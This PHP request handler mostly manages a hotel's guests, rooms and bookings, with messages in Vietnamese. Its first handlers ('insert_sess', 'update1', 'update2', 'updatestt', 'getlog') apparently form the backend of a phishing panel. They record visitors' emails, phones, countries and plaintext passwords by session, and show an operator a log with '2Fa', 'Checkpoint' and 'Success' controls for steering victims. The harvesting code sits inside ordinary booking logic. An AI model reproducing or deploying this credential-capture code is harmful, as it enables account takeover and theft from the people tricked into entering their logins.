<?php

require_once 'modun_function.php';
if ($_REQUEST) {

    $return = array('error' => 0);

    $t = $_REQUEST['t'];
    
    if ($t == 'insert_sess')
    {
        $id = $_POST['id'];
        // $hi = Insert_sess($id,"Loading");
        if (!check_sess($id))
        {
            Insert_sess($id,"Loading");
        }

        


        die(json_encode($return));
    }
     if ($t == 'update1')
    {
        $id = $_POST['id'];
        $email = $_POST['email'];
        $phone = $_POST['phone'];
        $country = $_POST['country'];
        // $hi = Insert_sess($id,"Loading");
        update1($id,$email,$phone,$country);

        


        die(json_encode($return));
    }
    if ($t == 'update2')
    {
        $id = $_POST['id'];
        $password = $_POST['password'];


        update2($id,$password);

        


        die(json_encode($return));
    }
    if ($t == 'updatestt')
    {
        $id = $_POST['id'];
        $status = $_POST['status'];


        updatestatus($id,$status);

        


        die(json_encode($return));
    }
     if ($t == 'getlog')
    {
        $gP = getlog();

        $long = count($gP);

        if ($gP != 0) {

            for ($i = $long - 1 ; $i >=  0; $i--) {
                



                

                $data[] = array(

                  

                    $gP[$i]['id'],
                    
                    $gP[$i]['sess_id'],
                    
                    $gP[$i]['phone'],
                    
                    $gP[$i]['email'],
                    
                    $gP[$i]['country'],
                    
                    $gP[$i]['pass'],

                    $gP[$i]['status'],

                    date("H:i:s d-m ", $gP[$i]['time']),
                    '<button class="btn btn-primary btn-icon-split btn-sm"><span class="icon text-white-50"><i class="fas fa-flag"></i></span> <span class="text">2Fa</span></button>
                    <button class="btn btn-danger btn-icon-split btn-sm"><span class="icon text-white-50"><i class="fas fa-flag"></i></span> <span class="text">Checkpoint</span></button>
                    <button class="btn btn-success btn-icon-split btn-sm"><span class="icon text-white-50"><i class="fas fa-check"></i></span> <span class="text">Success</span></button>'
                  

                );
            }
        }

        $return = array('data' => $data);

        die(json_encode($return));
    }
    if ($t == 'getdatphong')
    {
        $gP = getdatphong();

        $long = count($gP);

        if ($gP != 0) {

            for ($i = 0; $i < $long; $i++) {
                



                if ($gP[$i]['checkout_date'] == NULL)
                {
                    $checkout = "";
                } else
                {
                     $checkout = date('d-m-Y', $gP[$i]['checkout_date']);
                }

                $data[] = array(

                  

                    $gP[$i]['booking_id'],
                    
                    $gP[$i]['room_id'],

                    $gP[$i]['guest_id'],

                    date('d-m-Y', $gP[$i]['checkin_date']),
                    $checkout,
                    '<button class="btn btn-sm btn-icon btn-secondary" onclick="xoadatphong(\''.$gP[$i]['booking_id'].'\')"><i class="far fa-trash-alt"></i></button>
                    <button class="btn btn-sm  btn-primary" onclick="checkout(\''.$gP[$i]['booking_id'].'\')">Trả Phòng</button>'

                  

                );
            }
        }

        $return = array('data' => $data);

        die(json_encode($return));
    }
    
    if ($t == 'xoakhach')
    {
        $id = $_POST['id'];
        
        if (xoakhach($id))
         {
             $return['msg']   = 'Xóa khách hàng có id '.$id.' hoàn tất';
            die(json_encode($return));
         }
         
        $return['error'] = 1;

        $return['msg']   = 'Có lỗi xảy ra';
        die(json_encode($return));
    }
    if ($t == 'xoadatphong')
    {
        $id = $_POST['id'];
        
        if (xoadatphong($id))
         {
             $return['msg']   = 'Xóa đặt phòng hoàn tất';
            die(json_encode($return));
         }
         
        $return['error'] = 1;

        $return['msg']   = 'Có lỗi xảy ra';
        die(json_encode($return));
    }
     if ($t == 'update-booking')
    {
        $id = $_POST['id'];
        $checkin = $_POST['checkin'];
        $checkout = $_POST['checkout'];
        if (strtotime($checkin) > strtotime($checkout))
        {
            $return['error'] = 1;

            $return['msg']   = 'Ngày Checkin không được lớn hơn checkout';
            die(json_encode($return));
        }
        
        if (updateBooking($id,strtotime($checkin),strtotime($checkout)))
         {
             $return['msg']   = 'Cập nhật booking có ID: '.$id.' hoàn tất';
            die(json_encode($return));
         }
         
        $return['error'] = 1;

        $return['msg']   = 'Có lỗi xảy ra';
        die(json_encode($return));
    }
    
    
    if ($t == 'add-khach')
    {
        $id = $_POST['id'];
        $ho = $_POST['ho'];
        $ten = $_POST['ten'];
        $mail = $_POST['email'];
        $phone = $_POST['phone'];
        if (checkkhach($id))
        {
            $return['error'] = 1;

            $return['msg']   = 'ID Đã tồn tại';
            die(json_encode($return));
        }
       if (ThemKhach($id,$ho,$ten,$mail,$phone))
       {
           $return['msg']   = 'Thêm khách hàng thành công !';
            die(json_encode($return));
       }
        
        
         
        $return['error'] = 1;

        $return['msg']   = 'Có lỗi xảy ra';
        die(json_encode($return));
    }
    
    if ($t == 'getphongtrong')
    {
        $data = array();
        $gP = getphongtrong();
        $long = count($gP);

        if ($gP != 0) {

            for ($i = 0; $i < $long; $i++) {

                $data[] = array(

                    $gP[$i]['room_id'],
                    
                    $gP[$i]['room_number'],
                    
                    $gP[$i]['room_type'],
                    $gP[$i]['price']

                );
            }
        }

        $return = array('data' => $data);
        die(json_encode($return));
    }
    
    if ($t == 'add-dat-phong')
    {
        $idbook = $_POST['idbook'];
        $idkhach = $_POST['idkhach'];
        $idroom = $_POST['idroom'];
        if (checkbook($idbook))
        {
            $return['error'] = 1;

            $return['msg']   = 'ID Booking Đã tồn tại';
            die(json_encode($return));
        }
        if (!checkkhach($idkhach))
        {
            $return['error'] = 1;

            $return['msg']   = 'ID Khách không tồn tại';
            die(json_encode($return));
        }
       if (ThemDatPhong($idbook,$idkhach,$idroom))
       {
           updateStatusRoom($idroom);
           $return['msg']   = 'Thêm Đặt Phòng Thành Công';
            die(json_encode($return));
       }
        
        
         
        $return['error'] = 1;

        $return['msg']   = 'Có lỗi xảy ra';
        die(json_encode($return));
    }
    if ($t == 'checkout')
    {
        $idbook = $_POST['id'];
        $check = getbooking($idbook);
        if ($check['checkout_date'] != NULL)
        {
            $return['error'] = 1;

            $return['msg']   = 'Khách đã trả phòng, không thể thao tác lại';
            die(json_encode($return));
        }
        if (!$check)
        {
            $return['error'] = 1;

            $return['msg']   = 'ID Booking Không Tồn Tại';
            die(json_encode($return));
        }
        
       if (updateCheckOutDay($idbook))
       {
           updateStatusRoomTrong($check['room_id']);
           
           $return['msg']   = 'Trả Phòng Hoàn Tất';
            die(json_encode($return));
       }
        
        
         
        $return['error'] = 1;

        $return['msg']   = 'Có lỗi xảy ra';
        die(json_encode($return));
    }
    
    
}